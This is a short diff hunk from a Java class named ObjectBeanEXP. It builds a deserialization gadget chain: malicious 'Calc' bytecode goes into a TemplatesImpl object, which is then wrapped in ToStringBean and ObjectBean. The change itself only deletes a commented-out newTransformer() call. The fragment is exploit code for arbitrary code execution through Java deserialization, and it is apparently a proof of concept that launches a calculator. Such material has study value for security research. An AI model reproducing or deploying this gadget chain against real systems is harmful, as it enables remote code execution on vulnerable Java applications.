@@ -28,7 +28,7 @@ public class ObjectBeanEXP {
         byte[] evil = getTemplatesImpl("Calc");
         byte[][] codes = {evil};
         byteCodesField.set(templates,codes);
-//        templates.newTransformer();
+
         ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
         ObjectBean equalsBean = new ObjectBean(ToStringBean.class,toStringBean);
 
